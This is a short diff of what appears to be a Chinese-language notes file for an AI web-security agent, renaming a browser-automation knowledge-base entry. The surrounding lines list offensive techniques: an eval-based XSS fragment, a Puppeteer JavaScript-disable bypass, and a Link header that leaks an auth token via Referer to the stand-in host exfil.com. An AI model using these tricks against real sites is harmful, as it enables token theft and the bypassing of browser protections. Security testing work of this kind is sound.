@@ -209,7 +209,7 @@ throw onerror=eval,1
 - `$AGENT_DIR/knowledge-base/web-vulnerabilities.md` — 服务端漏洞模式
 - `$AGENT_DIR/knowledge-base/race-conditions.md` — 单包攻击 + 原型链污染
 - `$AGENT_DIR/knowledge-base/csp-bypass.md` — CSP 绕过专题
-- `$AGENT_DIR/knowledge-base/browser-debugging.md` — 浏览器调试方法
+- `$AGENT_DIR/knowledge-base/browser-automation.md` — 浏览器自动化 — 启动 / 登录 / 接管 / 确认
 
 - **Puppeteer JS 开关旁路**: page.setJavaScriptEnabled(false) 只影响当前上下文——iframe 内 window.open() 开的新窗口 JS 恢复启用。
 - **Link 头 Referer 泄露**: 响应头 `Link: <https://exfil.com/x>; rel="preload"; as="image"; referrerpolicy="unsafe-url"` 使 Chrome 以完整 URL 作 Referer 拉资源——token 在 /auth/callback?token= 时泄露。
